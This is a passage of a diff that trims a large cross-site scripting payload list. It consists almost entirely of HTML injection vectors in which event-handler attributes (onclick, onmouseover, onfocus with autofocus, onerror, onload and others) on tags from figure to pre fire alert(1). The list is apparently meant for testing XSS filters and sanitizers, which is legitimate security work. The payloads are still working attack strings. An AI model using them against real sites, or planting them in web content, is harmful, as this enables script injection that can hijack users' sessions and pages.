-<figure ondblclick="alert(1)">test</figure>
-<figure onmousedown="alert(1)">test</figure>
-<figure onmouseenter="alert(1)">test</figure>
-<figure onmouseleave="alert(1)">test</figure>
-<figure onmousemove="alert(1)">test</figure>
-<figure onmouseout="alert(1)">test</figure>
-<figure onmouseover="alert(1)">test</figure>
-<figure onmouseup="alert(1)">test</figure>
-<font id=x tabindex=1 onactivate=alert(1)></font>
-<font id=x tabindex=1 onfocus=alert(1)></font>
-<font id=x tabindex=1 onfocusin=alert(1)></font>
 <font onclick="alert(1)">test</font>
-<font oncontextmenu="alert(1)">test</font>
 <font ondblclick="alert(1)">test</font>
-<font onmousedown="alert(1)">test</font>
-<font onmouseenter="alert(1)">test</font>
-<font onmouseleave="alert(1)">test</font>
-<font onmousemove="alert(1)">test</font>
 <font onmouseout="alert(1)">test</font>
-<font onmouseover="alert(1)">test</font>
 <font onmouseup="alert(1)">test</font>
-<footer onclick="alert(1)">test</footer>
-<footer oncontextmenu="alert(1)">test</footer>
-<footer ondblclick="alert(1)">test</footer>
-<footer onmousedown="alert(1)">test</footer>
-<footer onmouseenter="alert(1)">test</footer>
-<footer onmouseleave="alert(1)">test</footer>
-<footer onmousemove="alert(1)">test</footer>
-<footer onmouseout="alert(1)">test</footer>
-<footer onmouseover="alert(1)">test</footer>
-<footer onmouseup="alert(1)">test</footer>
-<form id=x tabindex=1 onactivate=alert(1)></form>
-<form id=x tabindex=1 onfocus=alert(1)></form>
-<form id=x tabindex=1 onfocusin=alert(1)></form>
 <form onclick="alert(1)">test</form>
-<form oncontextmenu="alert(1)">test</form>
 <form ondblclick="alert(1)">test</form>
-<form onmousedown="alert(1)">test</form>
-<form onmouseenter="alert(1)">test</form>
-<form onmouseleave="alert(1)">test</form>
-<form onmousemove="alert(1)">test</form>
 <form onmouseout="alert(1)">test</form>
-<form onmouseover="alert(1)">test</form>
 <form onmouseup="alert(1)">test</form>
-<form onreset=alert(1)><input type=reset>
-<form onsubmit=alert(1)><input type=submit>
 <frame onclick="alert(1)">test</frame>
-<frame oncontextmenu="alert(1)">test</frame>
-<frame ondblclick="alert(1)">test</frame>
-<frame onmousedown="alert(1)">test</frame>
-<frame onmouseenter="alert(1)">test</frame>
-<frame onmouseleave="alert(1)">test</frame>
-<frame onmousemove="alert(1)">test</frame>
-<frame onmouseout="alert(1)">test</frame>
-<frame onmouseover="alert(1)">test</frame>
-<frame onmouseup="alert(1)">test</frame>
-<frameset onclick="alert(1)">test</frameset>
-<frameset ondblclick="alert(1)">test</frameset>
-<frameset onmousedown="alert(1)">test</frameset>
-<frameset onmouseenter="alert(1)">test</frameset>
-<frameset onmouseleave="alert(1)">test</frameset>
-<frameset onmousemove="alert(1)">test</frameset>
-<frameset onmouseout="alert(1)">test</frameset>
-<frameset onmouseover="alert(1)">test</frameset>
-<frameset onmouseup="alert(1)">test</frameset>
 <frameset onpageshow=alert(1)>
 <frameset><frame id=x onfocus=alert(1)>
-<frameset><frame id=x onfocusin=alert(1)>
 <frameset><frame onload=alert(1)>
-<h1 draggable="true" ondrag="alert(1)">test</h1>
-<h1 id=x tabindex=1 onactivate=alert(1)></h1>
-<h1 id=x tabindex=1 onfocus=alert(1)></h1>
-<h1 id=x tabindex=1 onfocusin=alert(1)></h1>
 <h1 onclick="alert(1)">test</h1>
 <h1 oncontextmenu="alert(1)">test</h1>
-<h1 oncopy="alert(1)" contenteditable>test</h1>
-<h1 oncut="alert(1)" contenteditable>test</h1>
 <h1 ondblclick="alert(1)">test</h1>
-<h1 onkeyup="alert(1)" contenteditable>test</h1>
 <h1 onmousedown="alert(1)">test</h1>
 <h1 onmouseenter="alert(1)">test</h1>
 <h1 onmouseleave="alert(1)">test</h1>
@@ -791,50 +310,13 @@ eval(location.hash.slice(1)>#alert(1)
 <h1 onmouseout="alert(1)">test</h1>
 <h1 onmouseover="alert(1)">test</h1>
 <h1 onmouseup="alert(1)">test</h1>
-<h1 onpaste="alert(1)" contenteditable>test</h1>
-<head id=x tabindex=1 onactivate=alert(1)></head>
-<head id=x tabindex=1 onfocus=alert(1)></head>
-<head id=x tabindex=1 onfocusin=alert(1)></head>
 <head onclick="alert(1)">test</head>
-<head oncontextmenu="alert(1)">test</head>
 <head ondblclick="alert(1)">test</head>
-<head onmousedown="alert(1)">test</head>
-<head onmouseenter="alert(1)">test</head>
-<head onmouseleave="alert(1)">test</head>
-<head onmousemove="alert(1)">test</head>
 <head onmouseout="alert(1)">test</head>
-<head onmouseover="alert(1)">test</head>
 <head onmouseup="alert(1)">test</head>
-<header onclick="alert(1)">test</header>
-<header oncontextmenu="alert(1)">test</header>
-<header ondblclick="alert(1)">test</header>
-<header onmousedown="alert(1)">test</header>
-<header onmouseenter="alert(1)">test</header>
-<header onmouseleave="alert(1)">test</header>
-<header onmousemove="alert(1)">test</header>
-<header onmouseout="alert(1)">test</header>
-<header onmouseover="alert(1)">test</header>
-<header onmouseup="alert(1)">test</header>
-<hgroup onclick="alert(1)">test</hgroup>
-<hgroup oncontextmenu="alert(1)">test</hgroup>
-<hgroup ondblclick="alert(1)">test</hgroup>
-<hgroup onmousedown="alert(1)">test</hgroup>
-<hgroup onmouseenter="alert(1)">test</hgroup>
-<hgroup onmouseleave="alert(1)">test</hgroup>
-<hgroup onmousemove="alert(1)">test</hgroup>
-<hgroup onmouseout="alert(1)">test</hgroup>
-<hgroup onmouseover="alert(1)">test</hgroup>
-<hgroup onmouseup="alert(1)">test</hgroup>
-<hr draggable="true" ondrag="alert(1)">test</hr>
-<hr id=x tabindex=1 onactivate=alert(1)></hr>
-<hr id=x tabindex=1 onfocus=alert(1)></hr>
-<hr id=x tabindex=1 onfocusin=alert(1)></hr>
 <hr onclick="alert(1)">test</hr>
 <hr oncontextmenu="alert(1)">test</hr>
-<hr oncopy="alert(1)" contenteditable>test</hr>
-<hr oncut="alert(1)" contenteditable>test</hr>
 <hr ondblclick="alert(1)">test</hr>
-<hr onkeyup="alert(1)" contenteditable>test</hr>
 <hr onmousedown="alert(1)">test</hr>
 <hr onmouseenter="alert(1)">test</hr>
 <hr onmouseleave="alert(1)">test</hr>
@@ -842,34 +324,13 @@ eval(location.hash.slice(1)>#alert(1)
 <hr onmouseout="alert(1)">test</hr>
 <hr onmouseover="alert(1)">test</hr>
 <hr onmouseup="alert(1)">test</hr>
-<hr onpaste="alert(1)" contenteditable>test</hr>
-<html id=x tabindex=1 onactivate=alert(1)></html>
-<html id=x tabindex=1 onfocus=alert(1)></html>
-<html id=x tabindex=1 onfocusin=alert(1)></html>
 <html onclick="alert(1)">test</html>
-<html oncontextmenu="alert(1)">test</html>
 <html ondblclick="alert(1)">test</html>
-<html onmousedown="alert(1)">test</html>
-<html onmouseenter="alert(1)">test</html>
-<html onmouseleave="alert(1)">test</html>
-<html onmousemove="alert(1)">test</html>
 <html onmouseout="alert(1)">test</html>
-<html onmouseover="alert(1)">test</html>
 <html onmouseup="alert(1)">test</html>
-<i draggable="true" ondrag="alert(1)">test</i>
-<i draggable="true" ondragend="alert(1)">test</i>
-<i id=x tabindex=1 onactivate=alert(1)></i>
-<i id=x tabindex=1 onbeforeactivate=alert(1)></i>
-<i id=x tabindex=1 onfocus=alert(1)></i>
-<i id=x tabindex=1 onfocusin=alert(1)></i>
 <i onclick="alert(1)">test</i>
 <i oncontextmenu="alert(1)">test</i>
-<i oncopy="alert(1)" contenteditable>test</i>
-<i oncut="alert(1)" contenteditable>test</i>
 <i ondblclick="alert(1)">test</i>
-<i onkeydown="alert(1)" contenteditable>test</i>
-<i onkeypress="alert(1)" contenteditable>test</i>
-<i onkeyup="alert(1)" contenteditable>test</i>
 <i onmousedown="alert(1)">test</i>
 <i onmouseenter="alert(1)">test</i>
 <i onmouseleave="alert(1)">test</i>
@@ -877,45 +338,13 @@ eval(location.hash.slice(1)>#alert(1)
 <i onmouseout="alert(1)">test</i>
 <i onmouseover="alert(1)">test</i>
 <i onmouseup="alert(1)">test</i>
-<i onpaste="alert(1)" contenteditable>test</i>
 <iframe id=x onfocus=alert(1)>
 <iframe id=x onfocusin=alert(1)>
-<iframe onblur=alert(1) id=x><input autofocus>
-<iframe onclick="alert(1)">test</iframe>
-<iframe oncontextmenu="alert(1)">test</iframe>
-<iframe ondblclick="alert(1)">test</iframe>
 <iframe onload=alert(1)></iframe>
-<iframe onmousedown="alert(1)">test</iframe>
-<iframe onmouseenter="alert(1)">test</iframe>
-<iframe onmouseleave="alert(1)">test</iframe>
-<iframe onmousemove="alert(1)">test</iframe>
-<iframe onmouseout="alert(1)">test</iframe>
-<iframe onmouseover="alert(1)">test</iframe>
-<iframe onmouseup="alert(1)">test</iframe>
-<iframe onreadystatechange=alert(1)></iframe>
-<image id=x tabindex=1 onfocus=alert(1)></image>
 <image onclick="alert(1)">test</image>
-<image oncontextmenu="alert(1)">test</image>
-<image ondblclick="alert(1)">test</image>
-<image onmousedown="alert(1)">test</image>
-<image onmouseenter="alert(1)">test</image>
-<image onmouseleave="alert(1)">test</image>
-<image onmousemove="alert(1)">test</image>
-<image onmouseout="alert(1)">test</image>
-<image onmouseover="alert(1)">test</image>
-<image onmouseup="alert(1)">test</image>
 <image src/onerror=alert(1)>
-<image src=validimage.png onload=alert(1)>
-<image src=validimage.png onloadend=alert(1)>
-<image src=validimage.png onloadstart=alert(1)>
 <image srcset=1 onerror=alert(1)>
-<img id=x tabindex=1 onactivate=alert(1)></img>
-<img id=x tabindex=1 onfocus=alert(1)></img>
-<img id=x tabindex=1 onfocusin=alert(1)></img>
 <img onclick="alert(1)">test</img>
-<img oncontextmenu="alert(1)">test</img>
-<img oncopy="alert(1)" contenteditable>test</img>
-<img oncut="alert(1)" contenteditable>test</img>
 <img ondblclick="alert(1)">test</img>
 <img onmousedown="alert(1)">test</img>
 <img onmouseenter="alert(1)">test</img>
@@ -925,47 +354,16 @@ eval(location.hash.slice(1)>#alert(1)
 <img onmouseover="alert(1)">test</img>
 <img onmouseup="alert(1)">test</img>
 <img src/onerror=alert(1)>
-<img src=validimage.png onload=alert(1)>
-<img src=validimage.png onloadend=alert(1)>
-<img src=validimage.png onloadstart=alert(1)>
 <img srcset=1 onerror=alert(1)>
-<img srcset=validimage.png onload=alert(1)>
 <input autofocus onfocus=alert(1)>
 <input autofocus onfocusin=alert(1)>
 <input id=x onfocus=alert(1)>
 <input id=x onfocusin=alert(1)>
 <input onauxclick=alert(1)>
-<input onbeforepaste=alert(1) value="" autofocus>
-<input onblur=alert(1) id=x><input autofocus>
 <input onchange=alert(1) value=xss>
 <input onclick="alert(1)">test</input>
-<input oncontextmenu="alert(1)">test</input>
-<input oncopy=alert(1) value="XSS" autofocus>
-<input oncut=alert(1) value="XSS" autofocus>
-<input ondblclick="alert(1)">test</input>
-<input onfocusout=alert(1) id=x><input autofocus>
 <input oninput=alert(1) value=xss>
-<input onmousedown="alert(1)">test</input>
-<input onmouseenter="alert(1)">test</input>
-<input onmouseleave="alert(1)">test</input>
-<input onmousemove="alert(1)">test</input>
-<input onmouseout="alert(1)">test</input>
-<input onmouseover="alert(1)">test</input>
-<input onmouseup="alert(1)">test</input>
-<input onpaste=alert(1) value="" autofocus>
-<input onselect=alert(1) value="XSS" autofocus>
-<input type=checkbox id=x onfocus=alert(1)>
-<input type=checkbox id=x onfocusin=alert(1)>
-<input type=image src=1 onerror=alert(1)>
-<input type=radio id=x onfocus=alert(1)>
-<input type=radio id=x onfocusin=alert(1)>
-<ins id=x tabindex=1 onactivate=alert(1)></ins>
-<ins id=x tabindex=1 onfocus=alert(1)></ins>
-<ins id=x tabindex=1 onfocusin=alert(1)></ins>
 <ins onclick="alert(1)">test</ins>
-<ins oncontextmenu="alert(1)">test</ins>
-<ins oncopy="alert(1)" contenteditable>test</ins>
-<ins oncut="alert(1)" contenteditable>test</ins>
 <ins ondblclick="alert(1)">test</ins>
 <ins onmousedown="alert(1)">test</ins>
 <ins onmouseenter="alert(1)">test</ins>
@@ -974,24 +372,7 @@ eval(location.hash.slice(1)>#alert(1)
 <ins onmouseout="alert(1)">test</ins>
 <ins onmouseover="alert(1)">test</ins>
 <ins onmouseup="alert(1)">test</ins>
-<isindex onclick="alert(1)">test</isindex>
-<isindex oncontextmenu="alert(1)">test</isindex>
-<isindex ondblclick="alert(1)">test</isindex>
-<isindex onmousedown="alert(1)">test</isindex>
-<isindex onmouseenter="alert(1)">test</isindex>
-<isindex onmouseleave="alert(1)">test</isindex>
-<isindex onmousemove="alert(1)">test</isindex>
-<isindex onmouseout="alert(1)">test</isindex>
-<isindex onmouseover="alert(1)">test</isindex>
-<isindex onmouseup="alert(1)">test</isindex>
-<isindex type=image src=1 onerror=alert(1)>
-<kbd id=x tabindex=1 onactivate=alert(1)></kbd>
-<kbd id=x tabindex=1 onfocus=alert(1)></kbd>
-<kbd id=x tabindex=1 onfocusin=alert(1)></kbd>
 <kbd onclick="alert(1)">test</kbd>
-<kbd oncontextmenu="alert(1)">test</kbd>
-<kbd oncopy="alert(1)" contenteditable>test</kbd>
-<kbd oncut="alert(1)" contenteditable>test</kbd>
 <kbd ondblclick="alert(1)">test</kbd>
 <kbd onmousedown="alert(1)">test</kbd>
 <kbd onmouseenter="alert(1)">test</kbd>
@@ -1004,47 +385,10 @@ eval(location.hash.slice(1)>#alert(1)
 <keygen autofocus onfocusin=alert(1)>
 <keygen id=x onfocus=alert(1)>
 <keygen id=x onfocusin=alert(1)>
-<keygen onclick="alert(1)">test</keygen>
-<keygen oncontextmenu="alert(1)">test</keygen>
-<keygen ondblclick="alert(1)">test</keygen>
-<keygen onmousedown="alert(1)">test</keygen>
-<keygen onmouseenter="alert(1)">test</keygen>
-<keygen onmouseleave="alert(1)">test</keygen>
-<keygen onmousemove="alert(1)">test</keygen>
-<keygen onmouseout="alert(1)">test</keygen>
-<keygen onmouseover="alert(1)">test</keygen>
-<keygen onmouseup="alert(1)">test</keygen>
-<label id=x tabindex=1 onfocus=alert(1)></label>
 <label onclick="alert(1)">test</label>
-<label oncontextmenu="alert(1)">test</label>
-<label ondblclick="alert(1)">test</label>
-<label onmousedown="alert(1)">test</label>
-<label onmouseenter="alert(1)">test</label>
-<label onmouseleave="alert(1)">test</label>
-<label onmousemove="alert(1)">test</label>
-<label onmouseout="alert(1)">test</label>
-<label onmouseover="alert(1)">test</label>
-<label onmouseup="alert(1)">test</label>
-<legend onclick="alert(1)">test</legend>
-<legend oncontextmenu="alert(1)">test</legend>
-<legend ondblclick="alert(1)">test</legend>
-<legend onmousedown="alert(1)">test</legend>
-<legend onmouseenter="alert(1)">test</legend>
-<legend onmouseleave="alert(1)">test</legend>
-<legend onmousemove="alert(1)">test</legend>
-<legend onmouseout="alert(1)">test</legend>
-<legend onmouseover="alert(1)">test</legend>
-<legend onmouseup="alert(1)">test</legend>
-<li draggable="true" ondrag="alert(1)">test</li>
-<li id=x tabindex=1 onactivate=alert(1)></li>
-<li id=x tabindex=1 onfocus=alert(1)></li>
-<li id=x tabindex=1 onfocusin=alert(1)></li>
 <li onclick="alert(1)">test</li>
 <li oncontextmenu="alert(1)">test</li>
-<li oncopy="alert(1)" contenteditable>test</li>
-<li oncut="alert(1)" contenteditable>test</li>
 <li ondblclick="alert(1)">test</li>
-<li onkeyup="alert(1)" contenteditable>test</li>
 <li onmousedown="alert(1)">test</li>
 <li onmouseenter="alert(1)">test</li>
 <li onmouseleave="alert(1)">test</li>
@@ -1052,49 +396,15 @@ eval(location.hash.slice(1)>#alert(1)
 <li onmouseout="alert(1)">test</li>
 <li onmouseover="alert(1)">test</li>
 <li onmouseup="alert(1)">test</li>
-<li onpaste="alert(1)" contenteditable>test</li>
-<link id=x tabindex=1 onactivate=alert(1)></link>
 <link onclick="alert(1)">test</link>
-<link oncontextmenu="alert(1)">test</link>
 <link ondblclick="alert(1)">test</link>
-<link onmousedown="alert(1)">test</link>
-<link onmouseenter="alert(1)">test</link>
-<link onmouseleave="alert(1)">test</link>
-<link onmousemove="alert(1)">test</link>
 <link onmouseout="alert(1)">test</link>
-<link onmouseover="alert(1)">test</link>
 <link onmouseup="alert(1)">test</link>
-<link rel=stylesheet href=1 onerror=alert(1)>
-<listing onclick="alert(1)">test</listing>
-<listing oncontextmenu="alert(1)">test</listing>
-<listing ondblclick="alert(1)">test</listing>
-<listing onmousedown="alert(1)">test</listing>
-<listing onmouseenter="alert(1)">test</listing>
-<listing onmouseleave="alert(1)">test</listing>
-<listing onmousemove="alert(1)">test</listing>
-<listing onmouseout="alert(1)">test</listing>
-<listing onmouseover="alert(1)">test</listing>
-<listing onmouseup="alert(1)">test</listing>
-<main id=x tabindex=1 onactivate=alert(1)></main>
-<main id=x tabindex=1 onfocus=alert(1)></main>
-<main id=x tabindex=1 onfocusin=alert(1)></main>
 <main onclick="alert(1)">test</main>
-<main oncontextmenu="alert(1)">test</main>
 <main ondblclick="alert(1)">test</main>
-<main onmousedown="alert(1)">test</main>
-<main onmouseenter="alert(1)">test</main>
-<main onmouseleave="alert(1)">test</main>
-<main onmousemove="alert(1)">test</main>
 <main onmouseout="alert(1)">test</main>
-<main onmouseover="alert(1)">test</main>
 <main onmouseup="alert(1)">test</main>
-<map id=x tabindex=1 onactivate=alert(1)></map>
-<map id=x tabindex=1 onfocus=alert(1)></map>
-<map id=x tabindex=1 onfocusin=alert(1)></map>
 <map onclick="alert(1)">test</map>
-<map oncontextmenu="alert(1)">test</map>
-<map oncopy="alert(1)" contenteditable>test</map>
-<map oncut="alert(1)" contenteditable>test</map>
 <map ondblclick="alert(1)">test</map>
 <map onmousedown="alert(1)">test</map>
 <map onmouseenter="alert(1)">test</map>
@@ -1103,92 +413,21 @@ eval(location.hash.slice(1)>#alert(1)
 <map onmouseout="alert(1)">test</map>
 <map onmouseover="alert(1)">test</map>
 <map onmouseup="alert(1)">test</map>
-<mark id=x tabindex=1 onactivate=alert(1)></mark>
-<mark id=x tabindex=1 onfocus=alert(1)></mark>
-<mark id=x tabindex=1 onfocusin=alert(1)></mark>
 <mark onclick="alert(1)">test</mark>
-<mark oncontextmenu="alert(1)">test</mark>
 <mark ondblclick="alert(1)">test</mark>
-<mark onmousedown="alert(1)">test</mark>
-<mark onmouseenter="alert(1)">test</mark>
-<mark onmouseleave="alert(1)">test</mark>
-<mark onmousemove="alert(1)">test</mark>
 <mark onmouseout="alert(1)">test</mark>
-<mark onmouseover="alert(1)">test</mark>
 <mark onmouseup="alert(1)">test</mark>
-<marquee onclick="alert(1)">test</marquee>
-<marquee oncontextmenu="alert(1)">test</marquee>
-<marquee ondblclick="alert(1)">test</marquee>
-<marquee onmousedown="alert(1)">test</marquee>
-<marquee onmouseenter="alert(1)">test</marquee>
-<marquee onmouseleave="alert(1)">test</marquee>
-<marquee onmousemove="alert(1)">test</marquee>
-<marquee onmouseout="alert(1)">test</marquee>
-<marquee onmouseover="alert(1)">test</marquee>
-<marquee onmouseup="alert(1)">test</marquee>
 <marquee onstart=alert(1)>XSS</marquee>
-<menu id=x tabindex=1 onactivate=alert(1)></menu>
-<menu id=x tabindex=1 onfocus=alert(1)></menu>
-<menu id=x tabindex=1 onfocusin=alert(1)></menu>
 <menu onclick="alert(1)">test</menu>
-<menu oncontextmenu="alert(1)">test</menu>
 <menu ondblclick="alert(1)">test</menu>
-<menu onmousedown="alert(1)">test</menu>
-<menu onmouseenter="alert(1)">test</menu>
-<menu onmouseleave="alert(1)">test</menu>
-<menu onmousemove="alert(1)">test</menu>
 <menu onmouseout="alert(1)">test</menu>
-<menu onmouseover="alert(1)">test</menu>
 <menu onmouseup="alert(1)">test</menu>
-<menuitem onclick="alert(1)">test</menuitem>
-<menuitem ondblclick="alert(1)">test</menuitem>
-<menuitem onmousedown="alert(1)">test</menuitem>
-<menuitem onmouseenter="alert(1)">test</menuitem>
-<menuitem onmouseleave="alert(1)">test</menuitem>
-<menuitem onmousemove="alert(1)">test</menuitem>
-<menuitem onmouseout="alert(1)">test</menuitem>
-<menuitem onmouseover="alert(1)">test</menuitem>
-<menuitem onmouseup="alert(1)">test</menuitem>
-<meta id=x tabindex=1 onactivate=alert(1)></meta>
-<meta id=x tabindex=1 onfocus=alert(1)></meta>
-<meta id=x tabindex=1 onfocusin=alert(1)></meta>
 <meta onclick="alert(1)">test</meta>
-<meta oncontextmenu="alert(1)">test</meta>
 <meta ondblclick="alert(1)">test</meta>
-<meta onmousedown="alert(1)">test</meta>
-<meta onmouseenter="alert(1)">test</meta>
-<meta onmouseleave="alert(1)">test</meta>
-<meta onmousemove="alert(1)">test</meta>
 <meta onmouseout="alert(1)">test</meta>
-<meta onmouseover="alert(1)">test</meta>
 <meta onmouseup="alert(1)">test</meta>
-<meter id=x tabindex=1 onfocus=alert(1)></meter>
 <meter onclick="alert(1)">test</meter>
-<meter oncontextmenu="alert(1)">test</meter>
-<meter ondblclick="alert(1)">test</meter>
-<meter onmousedown="alert(1)">test</meter>
-<meter onmouseenter="alert(1)">test</meter>
-<meter onmouseleave="alert(1)">test</meter>
-<meter onmousemove="alert(1)">test</meter>
-<meter onmouseout="alert(1)">test</meter>
-<meter onmouseover="alert(1)">test</meter>
-<meter onmouseup="alert(1)">test</meter>
-<multicol onclick="alert(1)">test</multicol>
-<multicol ondblclick="alert(1)">test</multicol>
-<multicol onmousedown="alert(1)">test</multicol>
-<multicol onmouseenter="alert(1)">test</multicol>
-<multicol onmouseleave="alert(1)">test</multicol>
-<multicol onmousemove="alert(1)">test</multicol>
-<multicol onmouseout="alert(1)">test</multicol>
-<multicol onmouseover="alert(1)">test</multicol>
-<multicol onmouseup="alert(1)">test</multicol>
-<nav id=x tabindex=1 onactivate=alert(1)></nav>
-<nav id=x tabindex=1 onfocus=alert(1)></nav>
-<nav id=x tabindex=1 onfocusin=alert(1)></nav>
 <nav onclick="alert(1)">test</nav>
-<nav oncontextmenu="alert(1)">test</nav>
-<nav oncopy="alert(1)" contenteditable>test</nav>
-<nav oncut="alert(1)" contenteditable>test</nav>
 <nav ondblclick="alert(1)">test</nav>
 <nav onmousedown="alert(1)">test</nav>
 <nav onmouseenter="alert(1)">test</nav>
@@ -1197,82 +436,14 @@ eval(location.hash.slice(1)>#alert(1)
 <nav onmouseout="alert(1)">test</nav>
 <nav onmouseover="alert(1)">test</nav>
 <nav onmouseup="alert(1)">test</nav>
-<nextid onclick="alert(1)">test</nextid>
-<nextid oncontextmenu="alert(1)">test</nextid>
-<nextid ondblclick="alert(1)">test</nextid>
-<nextid onmousedown="alert(1)">test</nextid>
-<nextid onmouseenter="alert(1)">test</nextid>
-<nextid onmouseleave="alert(1)">test</nextid>
-<nextid onmousemove="alert(1)">test</nextid>
-<nextid onmouseout="alert(1)">test</nextid>
-<nextid onmouseover="alert(1)">test</nextid>
-<nextid onmouseup="alert(1)">test</nextid>
-<nobr id=x tabindex=1 onactivate=alert(1)></nobr>
-<nobr id=x tabindex=1 onfocus=alert(1)></nobr>
-<nobr id=x tabindex=1 onfocusin=alert(1)></nobr>
 <nobr onclick="alert(1)">test</nobr>
-<nobr oncontextmenu="alert(1)">test</nobr>
 <nobr ondblclick="alert(1)">test</nobr>
-<nobr onmousedown="alert(1)">test</nobr>
-<nobr onmouseenter="alert(1)">test</nobr>
-<nobr onmouseleave="alert(1)">test</nobr>
-<nobr onmousemove="alert(1)">test</nobr>
 <nobr onmouseout="alert(1)">test</nobr>
-<nobr onmouseover="alert(1)">test</nobr>
 <nobr onmouseup="alert(1)">test</nobr>
-<noembed onclick="alert(1)">test</noembed>
-<noembed oncontextmenu="alert(1)">test</noembed>
-<noembed ondblclick="alert(1)">test</noembed>
-<noembed onmousedown="alert(1)">test</noembed>
-<noembed onmouseenter="alert(1)">test</noembed>
-<noembed onmouseleave="alert(1)">test</noembed>
-<noembed onmousemove="alert(1)">test</noembed>
-<noembed onmouseout="alert(1)">test</noembed>
-<noembed onmouseover="alert(1)">test</noembed>
-<noembed onmouseup="alert(1)">test</noembed>
-<noframes onclick="alert(1)">test</noframes>
-<noframes ondblclick="alert(1)">test</noframes>
-<noframes onmousedown="alert(1)">test</noframes>
-<noframes onmouseenter="alert(1)">test</noframes>
-<noframes onmouseleave="alert(1)">test</noframes>
-<noframes onmousemove="alert(1)">test</noframes>
-<noframes onmouseout="alert(1)">test</noframes>
-<noframes onmouseover="alert(1)">test</noframes>
-<noframes onmouseup="alert(1)">test</noframes>
-<noscript onclick="alert(1)">test</noscript>
-<noscript ondblclick="alert(1)">test</noscript>
-<noscript onmousedown="alert(1)">test</noscript>
-<noscript onmouseenter="alert(1)">test</noscript>
-<noscript onmouseleave="alert(1)">test</noscript>
-<noscript onmousemove="alert(1)">test</noscript>
-<noscript onmouseout="alert(1)">test</noscript>
-<noscript onmouseover="alert(1)">test</noscript>
-<noscript onmouseup="alert(1)">test</noscript>
 <object data=/ onload=alert(1)>
-<object data=/ onreadystatechange=alert(1)>
-<object id=x onfocus=alert(1) type=text/html>
-<object id=x onfocusin=alert(1) type=text/html>
-<object onclick="alert(1)">test</object>
-<object oncontextmenu="alert(1)">test</object>
-<object ondblclick="alert(1)">test</object>
-<object onerror=alert(1) data=1 type=image/gif>
-<object onmousedown="alert(1)">test</object>
-<object onmouseenter="alert(1)">test</object>
-<object onmouseleave="alert(1)">test</object>
-<object onmousemove="alert(1)">test</object>
-<object onmouseout="alert(1)">test</object>
-<object onmouseover="alert(1)">test</object>
-<object onmouseup="alert(1)">test</object>
-<ol draggable="true" ondrag="alert(1)">test</ol>
-<ol id=x tabindex=1 onactivate=alert(1)></ol>
-<ol id=x tabindex=1 onfocus=alert(1)></ol>
-<ol id=x tabindex=1 onfocusin=alert(1)></ol>
 <ol onclick="alert(1)">test</ol>
 <ol oncontextmenu="alert(1)">test</ol>
-<ol oncopy="alert(1)" contenteditable>test</ol>
-<ol oncut="alert(1)" contenteditable>test</ol>
 <ol ondblclick="alert(1)">test</ol>
-<ol onkeyup="alert(1)" contenteditable>test</ol>
 <ol onmousedown="alert(1)">test</ol>
 <ol onmouseenter="alert(1)">test</ol>
 <ol onmouseleave="alert(1)">test</ol>
@@ -1280,50 +451,9 @@ eval(location.hash.slice(1)>#alert(1)
 <ol onmouseout="alert(1)">test</ol>
 <ol onmouseover="alert(1)">test</ol>
 <ol onmouseup="alert(1)">test</ol>
-<ol onpaste="alert(1)" contenteditable>test</ol>
-<optgroup onclick="alert(1)">test</optgroup>
-<optgroup ondblclick="alert(1)">test</optgroup>
-<optgroup onmousedown="alert(1)">test</optgroup>
-<optgroup onmouseenter="alert(1)">test</optgroup>
-<optgroup onmouseleave="alert(1)">test</optgroup>
-<optgroup onmousemove="alert(1)">test</optgroup>
-<optgroup onmouseout="alert(1)">test</optgroup>
-<optgroup onmouseover="alert(1)">test</optgroup>
-<optgroup onmouseup="alert(1)">test</optgroup>
-<option onclick="alert(1)">test</option>
-<option oncontextmenu="alert(1)">test</option>
-<option ondblclick="alert(1)">test</option>
-<option onmousedown="alert(1)">test</option>
-<option onmouseenter="alert(1)">test</option>
-<option onmouseleave="alert(1)">test</option>
-<option onmousemove="alert(1)">test</option>
-<option onmouseout="alert(1)">test</option>
-<option onmouseover="alert(1)">test</option>
-<option onmouseup="alert(1)">test</option>
-<output onclick="alert(1)">test</output>
-<output oncontextmenu="alert(1)">test</output>
-<output ondblclick="alert(1)">test</output>
-<output onmousedown="alert(1)">test</output>
-<output onmouseenter="alert(1)">test</output>
-<output onmouseleave="alert(1)">test</output>
-<output onmousemove="alert(1)">test</output>
-<output onmouseout="alert(1)">test</output>
-<output onmouseover="alert(1)">test</output>
-<output onmouseup="alert(1)">test</output>
-<p draggable="true" ondrag="alert(1)">test</p>
-<p draggable="true" ondragend="alert(1)">test</p>
-<p id=x tabindex=1 onactivate=alert(1)></p>
-<p id=x tabindex=1 onbeforeactivate=alert(1)></p>
-<p id=x tabindex=1 onfocus=alert(1)></p>
-<p id=x tabindex=1 onfocusin=alert(1)></p>
 <p onclick="alert(1)">test</p>
 <p oncontextmenu="alert(1)">test</p>
-<p oncopy="alert(1)" contenteditable>test</p>
-<p oncut="alert(1)" contenteditable>test</p>
 <p ondblclick="alert(1)">test</p>
-<p onkeydown="alert(1)" contenteditable>test</p>
-<p onkeypress="alert(1)" contenteditable>test</p>
-<p onkeyup="alert(1)" contenteditable>test</p>
 <p onmousedown="alert(1)">test</p>
 <p onmouseenter="alert(1)">test</p>
 <p onmouseleave="alert(1)">test</p>
@@ -1331,39 +461,8 @@ eval(location.hash.slice(1)>#alert(1)
 <p onmouseout="alert(1)">test</p>
 <p onmouseover="alert(1)">test</p>
 <p onmouseup="alert(1)">test</p>
-<p onpaste="alert(1)" contenteditable>test</p>
-<param id=x tabindex=1 onfocus=alert(1)></param>
 <param onclick="alert(1)">test</param>
-<param oncontextmenu="alert(1)">test</param>
-<param ondblclick="alert(1)">test</param>
-<param onmousedown="alert(1)">test</param>
-<param onmouseenter="alert(1)">test</param>
-<param onmouseleave="alert(1)">test</param>
-<param onmousemove="alert(1)">test</param>
-<param onmouseout="alert(1)">test</param>
-<param onmouseover="alert(1)">test</param>
-<param onmouseup="alert(1)">test</param>
-<picture onclick="alert(1)">test</picture>
-<picture oncontextmenu="alert(1)">test</picture>
-<picture ondblclick="alert(1)">test</picture>
-<picture onmousedown="alert(1)">test</picture>
-<picture onmouseenter="alert(1)">test</picture>
-<picture onmouseleave="alert(1)">test</picture>
-<picture onmousemove="alert(1)">test</picture>
-<picture onmouseout="alert(1)">test</picture>
-<picture onmouseover="alert(1)">test</picture>
-<picture onmouseup="alert(1)">test</picture>
-<plaintext onclick="alert(1)">test</plaintext>
-<plaintext ondblclick="alert(1)">test</plaintext>
-<plaintext onmouseout="alert(1)">test</plaintext>
-<plaintext onmouseup="alert(1)">test</plaintext>
-<pre id=x tabindex=1 onactivate=alert(1)></pre>
